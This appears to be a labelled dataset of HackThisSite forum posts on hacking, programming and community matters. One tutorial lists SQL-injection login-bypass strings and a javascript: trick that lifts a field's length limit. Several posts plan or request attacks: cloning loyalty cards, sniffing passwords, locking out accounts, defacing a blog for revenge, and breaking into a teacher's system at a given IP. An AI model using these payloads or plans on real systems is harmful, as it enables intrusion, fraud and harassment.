pretty difficult message to decode. this is because the encryption was cyclic. however all we need is the correct key. since we know that key, the same operation produces the plain text again. cypher: ups?cs  mjamf bpyd b?zsncdsjlyjxi?? jauguadlvalrmmuz aannp?imdpjsjkoxv rckvmanmjxtc?.mio eqiaayhfwmnmuvge key:    hi my name is nathan lanehi my name is nathan lanehi my name is nathan lanehi my name is nathan lanehi my na xored we get the plain text again: text:   this is an example message that is absolutely arbitrary and serves no purpose but to be used in this example that is how a block cypher works. the same key and algorithm are used both to encrypt and decrypt messages. block cyphers are often used in encrypting media, like dvds, streams, and other signal broadcasts. drm is one of these, and therein is where the problem lies. block cyphers arent very good encrpytion, theyre just okay and theyre fast. but that is why it was so simple to create the decss library which decoded dvds for linux.  jon johansen  of norway single handedly decoded sonys dvd-based css (content scrambling system) with little more than analysis and a lot of patience. he stumbled across the two necessary pieces needed to decrypt dvds to be played without special software players or hardware dvd players. he found the algorithm and found out that the key was being stored in plain text on the media itself. another type of cryptography is  histographical  cryptography. this type of cryptography takes into account all of the possibilities available in a single message and encrypts using them. the key is typically supplied with the message since it varies from message to message and is completely message dependent. histographical encryption is often used for data compression. algorithms like gzip, bzip, zip, 7-zip, and rar all use histographical information to compress the files that are stored in their archives. one of the most common open standards for data compression is  lzma (lempel-ziv-markov chain algorithm , but i wont go into that now.  in a recent post  i briefly discussed coming to a solution of an encrypted message by analyzing the data and discovering the plain text by histographical data, for example that the letter e is the most common in the english language and that the space is even more common. well thats all for now. i hope that this was somewhat useful to some. take it as a primer in cryptography. thanks."

1	Hacking: Learn By Myself vs. Learning From Teachers	"i started programming at the age of 13. i started with c/c++ at first, not knowing how difficult it really was. back then, i just wanted to learn how to make my own games and have fun creating them. i never really thought of hacking just yet, nor did i know how useful programming could really be.  anyway, within six months i created my first game using c++. in the next few months i created a few short games, but stopped after realizing that my games were no good because of how bad they looked (i could only make my own graphics using ms paint because no one would help me). so, i quit programming and then i decided to focus on something else.  this was when i began becoming interested in hacking. i did some research and then i found this website, hackthissite. this happened when i was 14. i tried some of the challenges but i figured out that i couldnt really do much of them due to my lack of experience in the field. so, i left hts for a while, did some more research and continued to practice my programming, and then later i came back to hts with more experience. this time i was able to do more of the challenges, and i felt that i had actually learned a lot more about computers now.  i have already been programming for about 2 and a half years. since i ever started programming, my parents have always been telling me to consider taking some classes on programming, so that the ""teacher"" could ""lead me in the right direction"" to make sure that i didnt pick up any bad programming habits. im usually the kind of person who likes to learn stuff on his own and not rely on other people to teach it to him, so i denied my parents offer and continued to learn programming on my own.  now that im 15 though, my parents dont seem to view programming as such an important thing in my life anymore. they have been telling me to focus on school from now on, forget about programming, go to a good college and let the professors teach me programming, which is something that i do not want to happen. not that i dont want people to teach me programming and things about computers, but i enjoy learning stuff on my own. if i had taken programming classes 2 years ago when i was 13, then im completely sure that i would not have enjoyed programming as much as i do now. i learned so many things on my own: html, css, javascript, c/c++, sdl, and a little bit of each of the win32 api, sdl, opengl, and directx. and what amazed me the most was that no one taught me any of this stuff - i learned it all by myself.  however, my parents are now thinking that learning programming and computers by myself isnt such a good thing anymore. now they view programming as just a bunch of bs, saying that it is nothing if i cant get a job or go to college. they keep telling me to get good grades in school, which i obviously do, but nevertheless they still bother me about it. i get mostly as and a few bs in school, yet they still wont stop nagging me.  i basically stopped playing games most of the time now to start focusing more on learning about computers and programming, and my parents dont seem to care at all. they tell me to go to a class and learn about it, and they recommended me this class somewhere at a community college. it attempts to teach me ""the basics of c++ programming"", using one of the shittiest books ever written (in 1993), by eric robertson.  so, now that i have mentioned all of that, i want to ask you. do you think that i should take some classes in programming and computers, or am i better off just learning by myself? i do not think that professors/teachers are right about everything and if i rely on other people to teach me then i can basically be sure that ill lose interest in computers very quickly.  also, will i be able to achieve the same skillset by learning by myself compared to taking an actual course in computers?  have you seen people who have self taught themselves programming and were still successful in life?  and what should i do about my parents?  fyi they think that hacking is cracking and im not going to bother convincing them (otherwise they might lock up the computer or something) so what should i do about that?  do you know of any good reasons to learn by myself and not learn purely from a professor or teacher?  i want to learn a lot about computers, but i want to make sure that i dont mess up and pick up bad habits, etc.  any advice, suggestions, or comments are are appreciated.  thanks."
0	Basic Mysql Injection/Prevention	"basic mysql injection a tutorial by abax introduction: many ""script kiddes"", out there try to use injections to their advantage, i will show you how to simple injections,  and slightly advanced, as well as help protecting your self from these so called ""mysql injections"". requirements: - basic html knowledge - basic javascript knowledge - basic mysql knowledge - a site that is open to this attack, or make one =) basic outline: every time to time their is one person that will try to attack your site, or heck it could be you trying to use  mysql injections,but it comes down to the fact that you need to know how, if your big with site creation/devlopment  or maintenance/security. so their are many types of attacks but the worst, and possibly easist would be a mysql  injection or a server side include. in this case lets say you made a site that uses mysql to store/receive data, and maybe its for an administrator  panel or member login, any the do you need it to be secure by many reasons, so whats the best way to protect  yourself, some client side protections and some server side protections, but before we can think of protecting we  have to do so. the most common sql injection know would be to go to an admin panel, plop in an injection and gain control to the  site, which is a huge no-no. so how is this done? a couple ways heck a lot. i will be cover the basics and some  more advanced later on in a different tutorial. so if we look at this code what does this do to mysql? code:  select all or= if you now some ""mysql scripting"", you would now that it tells it to select from null or usally the admin  username/password dependent on the field. so thats one and their can be many for example a huge list i have: 1or1=1 admin--  or 0=0 -- "" or 0=0 -- or 0=0 --  or 0=0 # "" or 0=0 # or 0=0 #  or x=x "" or ""x""=""x ) or (x=x  or 1=1-- "" or 1=1-- or 1=1--  or a=a-- "" or ""a""=""a ) or (a=a "") or (""a""=""a hi"" or ""a""=""a hi"" or 1=1 -- hi or 1=1 -- hi or a=a hi) or (a=a hi"") or (""a""=""a  so you get the point that all it is doing is selecting the appropriate table, now if we injected this into a form  for admin login we could very easy gain access which aint bad for ctrl+copy and ctrl+pasting this small code.  but there is a small problem depending on the site it may restrict certian characters or only give you 6 character  spaces to work with this is were some common sense, javascript injection and html coding comes into play. this is probably the most important part except for the security. you will need to make some sort of code to make  the inputs maxlength var bigger or delete a javascript function that cleans, or even disable server side practice  which is really hard.  but to be nice i will explain some basic javascript injection so you can make some things  work out, if you havent you should look at the nice javascript injection tutorial which explains it, and the code. make ""password"" maxlength value 30: code:  select all javascript:void(document.forms[0].password.maxlength=30) check it with: code:  select all javascript:alert(document.forms[0].password.maxlength) now that you can see a basic way to exploiting some unsafe sites, how do you make yours safer? mainly by blocking  input, checking for refer url, checking length of fields, and making a server side checker so that its almost  unbeatable. i will only cover a fraction, and this is were you have to code a simple javascript function that checks  if the input is good, and based on that return an answer, i will not supply the code but give you a theory. check through every char and if the char is not a good char for example: ,"",=,<>... ect."
1	lnkgt survey	hi hts users, i am having some troubles with a program i downloaded. you have to enter a password, and you get it after you completed one of the surveys. (here is the link:  [url=nope]link removed[/url] ) for all the surveys you have to pay (send an sms) to complete. i was wondering if it could be hacked? if yes, could some one please explain it to me, or maybe do it for me?

0	School Network	"hey, back in the day when i used to be on hts alot (like 3 years ago) there was a ton of articles about stuff to do with school networks, tips for people wantin to browse freely at school, etc. there doesnt seem to be as many now, but its probably still an interest for some people. anyway, i thought someone might want to have a look at how my school network is. it was like this 3 years ago, and its still like this, except stricter. its like they expect it to be targeted by some pro hackers whose sole aim is to disrupt a public high school network. anyway here are some things about it. none of the tips offered on this site have ever worked. - school internet we share the same internet proxy server as all the other schools in my state. all the tips for disabling/getting around school proxies were based on proxies installed on the machine itself or on a school server. however, this one was like a blanket proxy on every single computer, running off a seperate machine in my states capital city or something. not 1 single trick of the trade worked to get around this proxy. not one. - command prompt a year or two back, i showed my mate how to send messages over the network through command prompt. as trends do, within the week the entire school was doing it. eventually i showed him how to send a non-stop repeat message to every computer in the school through a batch file, and he did it. the message read "" you have been hacked by <my name> and <his name>"" within minutes the i.t guy, who is the mastermind of the strict control over our school network, was at our classroom checking the numbers he had written on every single computer in the school, when he came to mine and my friends desk he pointed at my friend and said ""you?"" i had written the batch file and practically hit the enter key with my friends finger but my friend took the rap and went with the i.t guy to his office. he told me later he was unable to answer any of the questions the guy asked him about it lol. anyway shortly after that, we were no longer able to send messages, not because he had stopped the message sending itself, but when u entered who you wanted the message to go to it said ""the message alias cannot be found.""  he had like totally disconnected the students user accounts from each other. dont know how he did, but anyway everything i tried didnt work. anyway over the holidays he implemented a ""managed operating environment v 2.0"" which means that now, you cannot right click. but wait go to control panel and change mouse buttons? nope, control panel, simply, does not exist. there is no c drive. none that i can find anyway. no ""run..."" program. i tried the trick of making a batch file that basically is a command prompt: ""@echo off cmd @echo on"" i open it and it says ""command prompt has been disabled."" yet another of the most reliable tricks outsmarted. so i tried not creating a command prompt but just a batch file to disable the mouse. (dont know why, this never worked before anyway, he had somehow disabled rundll32) anyway a message came up saying ""you are not authroized to do this. your account details have been sent to your administrator and your events logged"" or something like that. also, all computers are run off one server, so change a desktop background, log on next time and its changed back. most settings for the computer are disabled anyway. anyway i managed to find the schoo logon server and i went into it and i found a notepad document that read. do not add, edit, or delete any files in this computer. it affects all computers in the region and you risk having your account suspended. it seemed a little strange so i tried deleting something and i couldnt anyway. ""access denied""  yeah anyway, every single trick ever mentioned to do with school networks has failed on my school network.  also, out of interest, our admin seems to be able to put admin-only access on any folder or file he wants, how can i do this?"

3	Basic Mission 1 – “The Idiot Test”	requirements:   basic understanding of html and browser functions. if you are reading this then you are likely new to hackthissite (hts). let me be the first to welcome you! many of you are here to wishing to either learn, or to test your current knowledge of hacking/security. learning the art of hacking takes a lot of work, patience, and determination. it will not happen overnight, and if you continue down this road, will spend the next several years honing your skills. let’s begin. the goal of nearly every mission on hts is to find a password through exploitation. if you tried to enter your login password for basic 1, slow down. each mission has a description and a clue that will help direct you on exploiting the login prompt  (make sure to read the clues carefully) . for basic 1, knowledge of hyper text markup language (html) is required. html is the main markup language for creating web pages and other information displayed in a web browser. you can easily view this code for any given webpage using your browser (ahem). if you are already lost or confused it’s time to do some research and practice your googlefu! practice writing a couple of basic web pages. remember, the goal is not to get the mission completion points, the goal is to learn. good luck! do not post spoilers!
1	Projects?	i have wanted to start tampering with cards for a while now. anything ranging from work badges, gift cards, rewards cards, to credit cards. i decided to start up a little project to get my foot in the door using a rewards card. a local gas station gives these out like candy, even handling the registration process for you! it appears the rewards card has a unique identification number attached to it, and after some chatter in irc its most likely that upon swiping the card, it pulls the information out of a database based on the unique id. this makes sense as it keeps the more sensitive data in a non tamper-able location on the actual machine. however, with the ability to write over the cards unique id number, it leaves me with a chance to change it to another card, and hopefully one that has some value on it. after each transaction, the customer has the option to get a receipt or decline of course. these receipts have a section similar to the following: code:  select all ******************************************** name: john       card: 8320522 level: vip       visits: 87 ----------------------------------------- beverages purchased           2 pending offer                 1 off per gallon             0.23 ******************************************** im assuming the card: xxxxxxx is the card number. so with that being said, getting my hands on receipts is all it will take to find legitimate and valuable cards to impersonate. right now this is all theoretical, and i plan on purchasing some hardware shenanigans to make this a project to get my foot in the door of card hacking as i will deem it. anyway, let me know what you guys think about this. if you are working on any projects or will soon, i would also like to hear about them. any ideas on future projects for myself is also encouraged.

1	password sniffing on pineapple without ssl stripping	ssl stripping no longer works. ive been researching but gotten little results as to tutorials for other types of infusions. i want to get an infusion that can either get me wifi passwords or passwords to someones accounts as they log into them. if possible, i would like some er infusions to start with downloading. i tried the wps infusion and it didnt work well with my router (which is why i want to use rubyreaver or auto-reaver). so, what other infusions could be used to monitor my other computers web activities and the passwords that i get when i log in with my other computer (that im using as a target)? if possible, it would be nice if it was something i could use information i get from the pineap log and input into such an infusion to get my passwords. i learned from this video about how to use the pineap: https://www.youtube.com/watch?v=idhux4b ... ib0a8pkfht so yeah, i dont want to buy too many new devices. i want to rely on my pineapple, but if possible i might want the documentation or something similar to learn to use such infusions. i might plug a wireless modem into my pineapple someday and go wardriving, but i want to learn to hack my own wifi first to learn before i go wardriving. oh, and it turns out my router doesnt  really  have wps enabled. im trying to learn to capture the handshake. lol.

1	Kali boot problems	hello, my school has set up a network security course with hacking, malware etc. being discussed. to get a better insight into it, we are supposed to use kali linux to see it all in action, so to say. the course itself hasnt started yet, but we should make sure that we can boot the system somehow. so i tried. remembering what pain in the ass installing even user-friendly ubuntu on the new laptop with uefi was, i took my dust-covered older one. now, ive tried creating the booting usb with all the installers i could find - win32 disk imager recommended by the official documentation, and when the boot failed, i also tried rufus, unetbootin and uui (even the ubuntu command-prompt version) just to be sure. neverless, in all these cases the laptop recognized the disc, offered the screen with live - persistence - install options, but regardless of what i chose, after the plenty of white text rolled away i got a black screen. not turned off as some other forums suggest, but just black - no cursor, no command prompt, nothing. weirdest thing is that i actually got it to work two or three times, but it stopped working the next time i tried it again - in the same manner as mentioned before. the laptop im trying to use is  http://www.toshiba.eu/discontinued-products/satellite-a300d-11s/ has anyone any solution (or suggestion) to this, please?
3	a studying subforum?	so, as of right now if someone asks for help doing exercises in the back of their programming textbook or needs help with a linux study guide, thats not available to them. i bring this up because im studying for a computer science final and im supposed to take study questions from the back of each chapter and do the exercises. heres the thing. im not saying we should give away the answers because thats obviously cheating. heres what i am saying: so right now if someone wants to show their networking study guide for the final exam or any test thats coming up, or just a study guide for a computer class in general, then if they post that here it gets marked as spam. but i think helping someone with their programming, networking, etc. class usually helps them learn about computers. we also encourage going to school here dont we? i mean, i remember when i had a prior thread about that old insecurity around a year ago about my age or whatever being too old and you all said to go to school. so obviously, we all encourage someone to go to school. so heres how it would work. someone would make a study guide or post the questions in the textbook or whatever, then theyd research or try to figure out the answer. if they cant understand a concept or they cant arrive at the right answer, or even if they cant confirm their answer was correct, then they could post it in the study help sub forum. i say this because right now we treat such behavior as spam. i think we should have a separate subforum for school assignments, and well just have a rule that no one is allowed to give you the answer or anything you could plagiarize. they could only give examples and explanations, and pointers in the right direction if the person has the wrong idea or is only slightly off. this way, the person isnt cheating, but maybe their tutor isnt available, then they can post in a separate subforum to make sure they are getting certain terms correct, etc. the person would still be required to show theyve either done research or spent real time figuring out the concept, or both. i am saying this because ive run into this before with myself and i think if one posts these things in a normal forum, it isnt really too appropriate for the subforums we already have. this section could also help with other subjects outside of computing as maybe a subsubforum (or maybe im pushing for it a little too much). im not trying to be self-centered, but i feel if one person has a problem, then theres a small chance multiple people will too or that someone else will have a similar view point. anyone agree? update!!! this is a terrible idea. forget the concept. i should never have suggested this in the first place. i care more about learning than test scores. i suggested this because i wanted to help people learn concepts like understanding definitions and processes. this was a terrible thread from the start. it probably should be locked and possibly removed is what i realize right now.

1	Testing a friends website	been some time since ive been on here! i was testing the security of a friends website, so i nmapd it.  good god almighty, what isnt open?  i told him about the result when i happened to check on that, but now im wanting to try and poke around a bit to see if there is actually a problem or not. for obvious reasons i wont say what site it is, but the open ports are: 21 53 80 81 110 143 443 465 993 995 1720 1863 3306 21 and 3306 seem to be of particular note.  as indicated by the existence and openness of 465, 993, and 995, the server appears to run a mail service. the thing is, im not really sure what to do.  i can ncat/putty to 21 and 3306, but i dont know how exactly those ports work, what they expect to receive (as in, what i should literally be typing in at them).  i tried searching for info on how to hack them but its kind of shaky. im not looking for someone to become a personal tutor here and walk me through this of course, but id appreciate it greatly if someone could explain the basics and point me to some tutorial that will guide me on what i need to do.  as a computer science major at a university, i feel i can both learn about computer networking from this project as well as helping my friend secure his website. thanks a lot, -ep
1	Where to start hacking/coding?	"hello all, i want to start coding/hacking and i was thinking this website would be wonderful to start, because it provides an interactive template. although i have zero experience in coding. what should be the first language to study, read and play with.  my goals would be to possibly create apps (ios, android, fairly decent simple apps), programs, try hacking techniques. i understand this is not something done overnight. i want advice from the people already doing these things and in a way have some form of mentor ship. i plan to practice a lot and i hope that this forums would be a great place to post when i am stuck on certain problems that i am having as i learn different techniques and what not. after i get some knowledge under my belt i would love to try and completely hack this website as a sense of accomplishment. what resources are more so beginner friendly and interactive as well. i like ideas that give ""homework"" in a sense, instead of just read and copy. if that makes sense! thanks for the time, chase"
1	Steganography FAQ/Mission Help	"i usually spend majority of my time helping users with their questions or maintaining the irc server with fellow opers. im fairly erudite in various topics but this is something i am a true neophyte in [steganography/cryptography]. i am naturally talented in mathematics,  i am willing to learn the applications  and implications that steganography/cryptography have within mathematics. esentially i am asking for someone to teach me the arts of stenganography & cryptography so i can apply what i learn within the various hts stego missions. assume that i know nothing and teach me ground up. i looked for articles within the hts website on these subjects and found nothing. so i am wondering if someone will teach me the basics that i need to complete the stego missions, or give me links to get a solid introduction to the subject. the hint for stego 1 doesnt help me: ""this is an encoded message, the only tip you get is 2 null bytes"". im sure the method to solve this problem may be obvious from the hint, but if one of you experts out there can give me a few helpful links or guides [not vague hints that are fruitless for a newbie] to help me complete this mission, please do so. it may take a while until i know enough to complete the mission, but thats fine with me. in summation: id like to get a solid introduction to steganography/cryptography, either through article/site, or if one of you experts out there will personally teach me. so i can learn and complete the missions. thanks, neophyte"
3	IRC issues	theres been some serious degradation of conversations in irc lately related to videos and pictures. i believe staff members know what i am talking about. i think that some action needs to be taken to stop these activities and conversations. i dont think that they are healthy to hackthissite and they will bring unneeded heat down upon the community as a whole in a very bad way. there are a couple of hackthissite staff members who have in the past week or so been promoting these activities and that is not helping the situation at all. personally - i /ignore anyone who mentions anything about the topic but hackthissite staff should begin to worry about their own asses as the people who will take the heat are the staff members for supporting/allowing these topics in irc. i realize that in #help any mention of the live tv/webcam sites is supposed to qualify for a gline however the conversations are continuing and one hackthissite member posted a link in #help this morning that should have definitely received a gline for. in my opinion any violator of these rules needs to be permanently glined to protect the community. if you have questions or need further explanation contact me in private and i will provide you an e-mail address you can use for secure communications.
3	antivirus files and signatures	hey i am doing some research on the way of the more popular av software (like norton, avast, eset and avg)  to test and mark executable files as  malware. now here is an interesting observations: 1. files that are  signed but not time-stamped are automatically treated as suspicious and more likely to be tested.   2. some av software run the file on local vm (there own vm) others run on a parallel jailed process on same machine     (i would love to know how you can check if the file currently running on the av - vm ... nothing to do about the jailed     process except maybe checking for parent processes). 3. some av check the reputation of the domain the file came from, and some even go there and download the file. 4. most of them create a list of steps that the file do, so they would be able to recognize it even if the file change. (like calling for some external urls, loading libraries in a specific order etc.) i open this thread in hope to create some knowledge base on the issue since, this info is not easy to find (i actually had to do some reverse engineering in order to get some of it).     so if any one have any thing to contribute to this issue (that is very hot right now on the malware front) please share here. and do us all a favor and post only credible information. (noobs)

1	where to now.	hi i am kind of new to hacking but i not from those who need you to tell them what to do everytime. i learned unix in a good level, i know c very very good, did a huge project with a friend in c. learned html, javascript and a little php but too much time as past since then so i dont remember my them good. i practice my unix a lot with ubuntu. not so long ago i crated a live cd of kali linux and started to learn about that. now i want to know if i want to learn how to hack to online games as maplestory and crate trainers for online games, if i want to get to a level where i can crack into wifi networks and do it from understandin every line. cause i did found a lot of tutorials about hacking into wifi connections with kali linux but still havent learned really everything in kali linux. i dont want to use stuff i dont understand. i am not trying to become a script kid. i finished all the basic missions here and got to realistic mission number 4. now in the real life sql injection wont really work in any normal website. what is the direction i need to take to get to the point i will eventually (after all the times it takes no metter what) know how to crate trainers of my own for online games. and hack to normal website (not facebook maybe at first but not those lame website the even sql injection can work on them.)  thanks a lot for those who took their time and read this
3	Newbies: Read This First	"so you want to know how to hack huh? do you want us to hack something for you? do you need the answers for missions on hackthissite.org? well guess what? it is not going to happen! im sick and tired of reading 5 threads in a day and hearing someone say in each one, ""how do i hack this?"", ""hack this for me"", ""im a newbie, what are the answers?"" suck it up and learn! we all started out just like you. i started out on hackthissite.org in 2004 learning more and more each day by  researching . that is the key. google should be your best friend. you know, it has been 4 years since i started out on here, and i would not consider myself a ""hacker"". yeah i may know  a lot  more than i used to, i may be able to crack some passwords here and there, but that took time. when i first created my username and password through hackthissite.org, i hardly ever used the forums. if i had a question about something, i  researched  it; through the forums, articles, and google. most of the time i found someone who had posted a topic in the forums that was very similar to my problem. thats what  you  should do. search everywhere and anywhere for your answer before you post a new topic. the hts community is sick of it. if you post something such as, ""will you hack blahblahblah.com for me?"" you will be ignored or yelled at for it. trust me! hacking is not about breaking passwords. its not about defacing somebodys website/webpage. its not about creating viruses and sending them to people to see how many files you can destroy.  its about learning on your own, learning from your mistakes, learning from other peoples mistakes, and researching."
3	Mac?	"i almost fear the rebuke coming from the windows world, but.... ""mac."" im a fan of what i call programmers oss, but as a whole rounded system, i prefer a good mac any day. at the end of the day, mac (with intel), can do all windows can do, and more. also... the mac makes a good front while you run windows-based infiltration software underneath as a virtual ip (legal, of course    ) anyway... why dont you give your opinion?"
3	SurftheChannel.com	http://www.surfthechannel.com/tv/peep_s ... 23226.html i was just watching that. peep show. fucking hilarious. down to business.. on the same link above, select all. on the left hand side of the margin youll find a hidden number. i had 1824, but it may change. click on it and itll say you dont have permission... can someone shed some light on what this is for? oh and i wasnt trying to hack the site. i dont know why i done it to be honest.. just ctrl + a.. investigate. merv.
1	Ok, I have a serious problem - Windows XP	i was playing around with the net user command and i decided to try and delete my current user account (the one that i was logged on to). so i did it, thinking that it wouldnt work, but it did. so i backed up my files by copying and pasting them into a folder in c:/, then i used net user command to create another user. however, theres a problem now.  i cant regain functionality in outlook express and the control panel. when i try to access user accounts in the control panel, it gives me an internet explorer script error, and if i close out the message box then another one just pop backs up. but thats not the problem. when i created user accounts via the control panel there was not this problem. but when i deleted the only user that was created using the control panel, i couldnt access the control panel anymore b/c of an invalid user error.  so now all the user accounts on xp that i have are accounts that were created using the command line, so basically now i cant access outlook express or user accounts in the control panel at all, with any user account.  does anyone have a solution to this? oh and is there a command that you can use to change the password hint of a user via the command line or something that can be accessed?
1	Need some help hacking a website..	ok well i wanna get back at this person cause theyve obviously have pissed me off (theyve done something that involves insulting one of my family members so yea), so i was wondering if anyone could help me hack their website and basically ruin their day as payback     but the problem is the website is a blogging website and i only wanna screw their day, everyone else im fine with so yea... if anyone can help that would be great cause im still learning the basics of hacking and if someone can explain to me what to do to ruin their day that would be greatly appreciated
1	Need help with a small problem.	"hey guys, im a returning member and i used to be active on the site then i created another account, played for a bit and stopped for a while due to life problems. anyways i haven’t done any hacking or anything for around 2 years and now i desperately need help. now bear with me because this may sound completely stupid but i need help finding an exploit on a facebook application. before you jump at me it’s actually not for me. the application is called ""owned!"" and some of you may have heard of it. it’s an application on facebook in which you buy pictures of one another trying to turn it over for profit. now my boss is an ""owned!"" addict and recently a few top members have found an exploit to generate billions of dollars and are buying everyone’s pictures and essentially cheating, of course leaving him behind. however he wants to find the exploit in order to show it to the developer so he can patch the hole and punish the cheaters. he gave me that task because he thinks i can do it but i haven’t done this in ages and i fear that if i don’t actually help him and refuse he’s going to make my life a living hell because hell take it personally. he’s texting and calling me every few hours and asks me about it everyday. so i really need to find it. for those of you still reading, i’ve narrowed it down to a few places where money exchange takes places and its most likely a javascript injection in the part of the application where you click the next button to see the next picture and 10 dollars is added to your money. however (a) i haven’t done this in ages and (b) facebook uses something called facebook mark up language and facebook javascript in order to execute javascript sandboxed in all applications which confuses me greatly. if moderators feel this is inappropriate please delete this or move it to an appropriate thread. if anyone can help me, please pm me. thank you."
1	Brute Force Account Logins	hi guys, i was wondering if anyone knows of any good brute force attacks for account logins. were supposed to test if the website can withstand the dos attack via account logins. the purpose of this is not to obtain the password. we know the usernames are made up of up to 7digits. for each username, after 5 unsuccessful attempts to login (with wrong password), that user account will be disabled (till he calls the service center). what we are trying to attempt is to get as many user accounts to be locked out such that a dos will occur. this will then indicate whether the website has proper web security implemented. i understand there are tools such as brutus, crowbar and burpsuite. but not sure if these tools can indeed perform such brute force account attacks. what i have read up so far is that these tools brute force to look for the passwords. but we do not want a successful logins.  could anyone kindly advice? thanks!

1	In training hacker who needs a little assistance	i try to get as involved with hacking as much as i can in my spare time.. but seeing as i am still in school its becoming more and more difficult to find the time.. i recently ran into a problem... my school has whats called a distance learning program.. you can take college level classes and watch them basically over a tv with communication from the teacher who is at a remote site.. me and my friends have recently run in to some problem with our teacher... we sign into her class by dialing the ip address on our projector.. i typed that in to the computer and of course she has it locked down... i was wondering if some could tell me how to get around this or possibly get her username and password for me.. to play a little practical joke on her.... not trying to cause major problems... jus gonna change her background or somethin to a picture of the class... the ip address is 170.211.164.103   if any one could help me out i would really appreciate it thanks
1	Problem with sessions. (PHP, SQL)	"im trying to make a login system for my website. ive got one entry in my database so far and i can login and it creates the session just fine, but 1. the logout script doesnt work. (dont know that for sure until question 2 is figured out.) and 2. my script to show the login form if there is no session and give a welcome message if there is one doesnt work... here are my two scripts: login - code:  select all <? if (session == true) {     echo ""welcome back, "" . $myusername . ""!<br /><br /><form name=logout method=post action=logout.php><input type=submit name=submit value=logout></form>""; } else {     echo ""login:<br /><br />           <form name=login method=post action=check_login.php>           <p>username: <input name=myusername type=text id=myusername><br />           password: &nbsp;<input name=mypassword type=text id=mypassword><br />           <input type=submit name=submit value=login>           </form>""; } ?> logout - code:  select all <? session_start(); session_destroy(); ?> i know thats not a lot of information to go on, but im confused. ask for more info if needed. the problem is that its not displaying the username after ""welcome back, "". also, i press the logout button and it brings me to a blank page, so i assume the php must be working, but either the session doesnt end, or the login script to check for a session isnt working... if im confusing anyone, im sorry. please help me!"

1	Back again :D	"hey guys, this is my new hts account, i lost the details for my old one. its been almost three years since i first created my old hts account. when i first came here i was computer illiterate and stumbled upon the site looking for a quick way to become uber leet haxxorz and learn how to steal runescape accounts (lol) i left 12 months later with a solid, invaluable knowledge of computers and the internet generation itself, that i doubt i could have learned so well anywhere else. i learnt about the ""hacking"" culture and how very much more complicated and in depth it was then just being able to steal peoples passwords. most importantly, i had very much fun here on the site and cs.net. in my absence of the past 2 years i see the site has had a great makeover and that good old cs has been replaced by hts very own forum. although i was learning so much about coding and computers, hts just wasnt doing it for me anymore and i spent the in between time playing world of warcraft. however today i just had a sudden urge to jump on old hts for the first time in 2 years...and, i daresay im back for good. loooking forward to checking out the forums and all the old challenges, and the new ones. going to be starting to program again, have to re download all the old programs like my c++ coder and stuff. i was starting to get good at it when i left. anyway, i will leave the post here, got a lot to check out thanks hts for all the knowledge you have provided me with, that has helped me in countless ways since i left last. i logged on almost everyday for a year since i first created my account, hoping that i would be able to steal someones rs account. thanks to hts i gained a knowledge of the internet and its culture that has been invaluable. the site delivered so much more than just a quick way to steal rs money. (actually, i still dont know any foolproof way you would do that. thats what its about though theres no ultimate hack tool that lets you do anything!)   good to be back, slayertheory"

1	How do i hack into a website (legally)	"hey guys, i was wundering, how do u hack into website? dont worry im not doing anything illegal, maybe,he he he! just kidding i just want 2 run a simple expierement, but i know nothing about hacking.nope. i dont even know html or how to program. wanna know why?cuz everything out there that i found was shit. all i found were how to ""become"" a hacker. yeah, cut the bullshit. and the only thing i did find was a stupid god-damn website where the sell you 800 fuckin dollar dvds that probably dont even work anyway! so just one simple quetion that ive googled and wiki-howed  about a million times! how do i actually hack?"
3	Tea Bag Washington	"i was recently sent an email stating that there was to be a ""new american tea party"". the whole idea was that on april first everyone was to send just 1 tea bag to this address  1600 pennsylvania ave. washington , d.c. 20500 . i personally think this is a great idea. although, being its the government.. the mail is probably  scanned before entering. so tea bags probably wont make it in. but if there is enough of them itll sure raise and eyebrow or nine.  hack this site was the first place i thought of when i got this email to get a message like this out. now this only includes people in america. but if you dont live here .. send one anyway, really doesnt matter.  spread the email posted below to as many people as you can if you choose to participate. hope this reaches at least 1 person . this is the email i received: tea bag what a wonderful idea, i just wish it had been mine. i have a feeling that usps is going to have a hell of a lot of tea to contend with, after all it only costs 42 cents to send a message, hopefully heard round the world! so please mark your calendars theres a storm a brewin. what happens when good, responsible people keep quiet? washington has forgotten they work for us. we dont work for them. throwing good money after bad is not the answer. i am sick of the midnight, closed door sessions to come up with a plan. i am sick of congress raking ceos over the coals while they, themselves, have defaulted on their taxes. i am sick of the bailed out companies having lavish vacations and retreats on my dollar. i am sick of being told it is my responsibility to rescue people that, knowingly, bought more house than they could afford. i am sick of being made to feel it is my patriotic duty to pay more taxes. i, like all of you, am a responsible citizen. i pay my taxes. i live on a budget and i dont ask someone else to carry the burden for poor decisions i may make. i have emailed my congressmen and senators asking them to not vote for the stimulus package as it was written without reading it first. no one listened. they voted for it, pork and all. o.k. folks, here it is. you may think you are just one voice and what you think wont make a difference. well, yes it will and yes, we can!! if you are disgusted and angry with the way washington is handling our taxes. if you are fearful of the fallout from the reckless spending of billions to bailout and ""stimulate"" without accountability and responsibility then we need to become one, loud voice that can be heard from every city, town, suburb and home in america. there is a growing protest to demand that congress, the president and his cabinet listen to us, the american citizens. what is being done in washington is not the way to handle the economic free fall. so, heres the plan. on april 1, 2009, all americans are asked to send a teabag to washington , d.c. you do not have to enclose a note or any other information unless you so desire.. just a teabag. many cities are organizing protests. if you simply search, ""new american tea party"", several sites will come up. if you arent the protester type, simply make your one voice heard with a teabag. your one voice will become a roar when joined with millions of others that feel the same way. yes, something needs to be done but the lack of confidence as shown by the steady decline in the stock market speaks volumes. this was not my idea. i visited the sites of the new american tea party and an online survey showed over 90% of thousands said they would send the teabag on april 1. why, april 1?? we want them to reach washington by april 15. will you do it? i will. send it to;  1600 pennsylvania ave. washington , d.c. 20500 . forward this to everyone in your address book. visit the website below for more information about the new american tea party. i would encourage everyone to go ahead and get the envelope ready to mail, then just drop it in the mail april 1. cant guarantee what the postage will be by then, it is going up as we speak, but have your envelope ready. what will this cost you? a little time and a 40 something cent stamp. what could you receive in benefits? maybe, just maybe, our elected officials will start to listen to the people. take out the pork. tell us how the money is being spent. we want transparency and accountability. remember, the money will be spent over the next 4-5 years. it is not too late. of course, if you agree with the way things are being done now, just delete"
2	Spam HTS Admin	i am not sure if this really is hacking, but i figured out an annoying way to send hundreds of emails to the person who develops the hts website. i did an lookup on the domain name, found the hosting service and went to the forgot my password page. there i entered a random word as a username. so i entered hts as the username, and clicked send me my password. then i just refreshed the page a couple times. obviously if i wrote a program that did this it would be much more effective. comments?

